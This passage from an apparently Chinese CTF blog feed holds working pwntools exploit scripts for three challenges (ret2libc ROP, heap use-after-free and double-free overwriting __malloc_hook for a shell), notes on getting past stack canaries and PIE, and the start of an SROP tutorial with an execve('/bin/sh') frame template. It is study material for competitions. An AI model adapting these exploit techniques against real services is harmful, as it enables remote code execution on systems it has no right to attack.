      <content type="html"><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>ret2libc</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;Emachine&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;172.29.32.110&apos;,&apos;8888&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def en(enc):</span><br><span class="line">s = []</span><br><span class="line">res = 0</span><br><span class="line">for i in range(8):</span><br><span class="line">sk = enc % 0x100</span><br><span class="line">enc = (enc - sk)/0x100 </span><br><span class="line">s.append(sk)</span><br><span class="line"></span><br><span class="line">for x in s:</span><br><span class="line">if x&gt;47 and x &lt;57:</span><br><span class="line">x ^= 0xf</span><br><span class="line">elif x&lt;= 64 and x &gt;90:</span><br><span class="line">x ^= 0xe</span><br><span class="line">elif x&lt;=96 and x&gt;122:</span><br><span class="line">x ^= 0xd</span><br><span class="line">res = x + res*0x100</span><br><span class="line">print s</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400c83</span><br><span class="line">#main = 0x400b28</span><br><span class="line">start = 0x400790</span><br><span class="line">sh.sendlineafter(&quot;Input your choice!\n&quot;,&apos;1&apos;)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.symbols[&apos;puts&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;oooooooo&apos;)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">leak = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">#print hex(e)</span><br><span class="line">#leak =en(e)</span><br><span class="line">print hex(leak)</span><br><span class="line">system = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;system&apos;]</span><br><span class="line">#environ = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;environ&apos;]</span><br><span class="line">read = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;read&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line">print hex(read)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">pop_rsi_r15 = 0x0000000000400c81</span><br><span class="line">#pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602080)+p64(0)+p64(read)+p64(start)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(elf.symbols[&apos;gets&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(system)+p64(start)</span><br><span class="line">sh.send(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>当时没看，血亏。</p><h2 id="题目-amp-amp-分析-1"><a href="#题目-amp-amp-分析-1" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>溢出+uaf漏洞</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,name):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;size: \n&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;name: \n&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index: \n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;weapon:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;666&apos;)</span><br><span class="line">    sh.sendlineafter(&quot;weapon:\n&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;c\n&apos;)</span><br><span class="line">create(0x60,&apos;a&apos;*0x10+p64(0x110)+p64(0x41)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&quot;attack_times: &quot;)</span><br><span class="line">libc.base = int(sh.recvuntil(&quot;\n&quot;,drop=True))-0x3c4b78</span><br><span class="line">print hex(libc.base)</span><br><span class="line">malloc_hook = libc.base+libc.symbols[&apos;__malloc_hook&apos;]#0x3c4b00</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">one_gadget = libc.base+0xf02a4#0x4526a</span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a&apos;*0xf0+p64(0x110)+p64(0x111))</span><br><span class="line">dele(2)</span><br><span class="line">dele(1)</span><br><span class="line">create(0x100,&apos;a&apos;*0x58+p64(0x71)+p64(malloc_hook-0x23)+&apos;\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;aaa&apos;+p64(one_gadget)+&apos;\n&apos;)</span><br><span class="line">#dele(7)</span><br><span class="line">#create(0x4f,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>没注意到一个煞笔漏洞，被忽悠的以为有size检测，把好好的一道送分题送了</p><h2 id="题目-amp-amp-分析-2"><a href="#题目-amp-amp-分析-2" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>开局可以泄露libc地址，本来用的是fmt，结果可以直接泄露。之后uaf</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&quot;./pwn&quot;)</span><br><span class="line">#sh = remote(&quot;172.29.21.114&quot;, 8888)</span><br><span class="line"># todo check libc version</span><br><span class="line">libc = ELF(&quot;libc-2.23.so&quot;, checksec = False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.sendafter(&quot;name?&quot;,&quot;a&quot;*7+&quot;b&quot;)</span><br><span class="line">sh.recvuntil(&quot;ab&quot;)</span><br><span class="line">addr = u64(sh.recv(6) +&quot;\x00&quot;*2)-0x6fdbd</span><br><span class="line">print(hex(addr))</span><br><span class="line">sh.sendlineafter(&quot;ID.&quot;,&quot;123&quot;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;story:&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;story&quot;, content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    sh.sendlineafter(&quot;choice:&quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;dex:&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">add(0x68, &quot;123&quot;)</span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(0x68, p64(addr+libc.symbols[&quot;__malloc_hook&quot;]-35))</span><br><span class="line">add(0x68,&quot;aaa&quot;)</span><br><span class="line">add(0x68,&quot;bbb&quot;)</span><br><span class="line">add(0x68,&quot;a&quot;*19+p64(addr+0xf1147))#0xf02a4))</span><br><span class="line"></span><br><span class="line">#add(0x10,&apos;a&apos;)</span><br><span class="line">#remove(0)</span><br><span class="line">#remove(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bypass Protect</title>
      <link href="/2019/05/29/bypass-protect/"/>
      <url>/2019/05/29/bypass-protect/</url>
      <content type="html"><![CDATA[<h1 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h1><p>canary用来检测栈溢出,程序正常的走完了流程，到函数执行完的时候，程序会再次从一个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。canary的最低位恒为零，使得不存在截断问题。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。<br>或者直接任意地址写覆盖返回地址之类的也可以绕过。</p><h2 id="针对fork的进程"><a href="#针对fork的进程" class="headerlink" title="针对fork的进程"></a>针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p><h2 id="ssp-leak（Stack-Smashing-Protector-）"><a href="#ssp-leak（Stack-Smashing-Protector-）" class="headerlink" title="ssp leak（Stack Smashing Protector ）"></a>ssp leak（Stack Smashing Protector ）</h2><p>如果canary被我们的值覆盖而发生了变化，程序会执行函数___stack_chk_fail()</p><p>___stack_chk_fail()源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (void) &#123;   </span><br><span class="line">__fortify_fail (&quot;stack smashing detected&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   const char *msg; &#123;</span><br><span class="line">      /* The loop is added only to keep gcc happy. */</span><br><span class="line">         while (1)</span><br><span class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p><p>__libc_message 的第二个%s输出的是argv[0]，argv[0]是指向第一个启动参数字符串的指针，会在栈中存放，只要能够输入足够长的字符串覆盖掉argv[0]，我们就能让canary保护输出我们想要地址上的值。</p><h2 id="Modify-the-TLS"><a href="#Modify-the-TLS" class="headerlink" title="Modify the TLS"></a>Modify the TLS</h2><p>正常情况下，canary取值是:<br>32 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, large gs:14h</span><br><span class="line">mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure></p><p>64 bits:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, fs:28h</span><br><span class="line">mov     [rbp+var_8], rax</span><br></pre></td></tr></table></figure></p><p>而段寄存器fs &amp;&amp; gs的定义是指向本线程的TLS结构</p><p>在vvar与 /lib/x86_64-linux-gnu/ld-2.23.so之间的一段空间,可以看到有写权限<br>64位一般在该段的起始地址＋0x1700+0x28处 /  32位      +0x14<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/sirius/tikool/prac/canary/canary_test</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fda000     0x7ffff7fdd000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/10gx 0x7ffff7fda000+0x1700</span><br><span class="line">0x7ffff7fdb700:0x00007ffff7fdb7000x00007ffff7fda010</span><br><span class="line">0x7ffff7fdb710:0x00007ffff7fdb7000x0000000000000000</span><br><span class="line">0x7ffff7fdb720:0x00000000000000000x2928659c8989cd00</span><br><span class="line">0x7ffff7fdb730:0xb97e5185f9afb6be0x0000000000000000</span><br><span class="line">0x7ffff7fdb740:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE(position-independent executable, 地址无关可执行文件)技术是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。</p><h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p><h2 id="leak-libc-addr"><a href="#leak-libc-addr" class="headerlink" title="leak libc addr"></a>leak libc addr</h2><p>PIE影响的只是程序加载基址，并不会影响指令间的相对地址，因此我们如果能泄露出程序或libc的某些地址，我们就可以利用偏移来达到目的。这也是比较常用的方法。</p><h2 id="vdso-vsyscall"><a href="#vdso-vsyscall" class="headerlink" title="vdso/vsyscall"></a>vdso/vsyscall</h2><p>在开启了ASLR的系统上运行PIE程序，就意味着所有的地址都是随机化的。然而在某些版本的系统中这个结论并不成立，原因是存在着一个神奇的vsyscall。（由于vsyscall在一部分发行版本中的内核已经被裁减掉了，新版的kali也属于其中之一。vsyscall在内核中实现，无法用docker模拟，因此任何与vsyscall相关的实验都改成在Ubuntu 16.04上进行，同时libc中的偏移需要进行修正）</p><p>关于vsyscall<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall</span><br></pre></td></tr></table></figure></p><p>由于vsyscall地址的固定性，这个本来是为了节省开销的设置造成了很大的隐患，因此vsyscall很快就被新的机制vdso所取代。与vsyscall不同的是，vdso的地址也是随机化的，且其中的指令可以任意执行，不需要从入口开始，这就意味着我们可以利用vdso中的syscall来干一些坏事了。</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn1.5--SROP</title>
      <link href="/2019/05/24/introduction-to-pwn1-5-srop/"/>
      <url>/2019/05/24/introduction-to-pwn1-5-srop/</url>
      <content type="html"><![CDATA[<p><em>这学期真实忙成狗，再加上之前状态不好，这学期pwn方向的技术没有太大进展，更多的是在查缺补漏，稳固基础</em></p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>之前没去看过，现在抽时间来看一下，原理比想象中的更简单一些，比较容易理解。<br>ctfwiki上的： <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#signal</a></p><p>这里直接使用wiki上的说法：</p><figure class="image-box">                <img src="/2019/05/24/introduction-to-pwn1-5-srop/rt_signal.png" alt="rt_signal" title="" class="">                <p>rt_signal</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。</span><br><span class="line"></span><br><span class="line">1. 内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</span><br><span class="line"></span><br><span class="line">2. 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</span><br><span class="line"></span><br><span class="line">3. signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</span><br></pre></td></tr></table></figure><p>简单来讲就是unix系统在传递signal信息时，会将进程信息以Signal Frame 的格式保存在用户态空间的栈中，而且在回调时并不会有任何检查，所以只要能够改变其结构中的关键数据，就可以使得在恢复进程执行时获得shell或者其他系统调用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><ul><li>利用条件</li></ul><ol><li>足够的栈溢出以存放sigal frame结构体（ps: 不一定要放在栈中</li><li>需要知道： <ul><li>“/bin/sh”</li><li>Signal Frame</li><li>syscall</li><li>sigreturn</li></ul></li></ol><ul><li>利用方式<br>pwntools中实现了SROP的库，这样就免去了自己费劲构造结构体的过程</li></ul><p>格式：(设置结构体中保存的需要修改的寄存器即可)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &apos;s addr</span><br><span class="line">sigframe.rsi = 0x0</span><br><span class="line">sigframe.rdx = 0x0</span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">xor     rax, rax;</span><br><span class="line">mov     edx, 400h;</span><br><span class="line">mov     rsi, rsp;</span><br><span class="line">mov     rdi, rax;</span><br><span class="line">syscall;</span><br><span class="line">retn;</span><br></pre></td></tr></table></figure></p><p>编译链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm srop.asm -f elf64</span><br><span class="line">ld -m elf_x86_64 srop.o -o 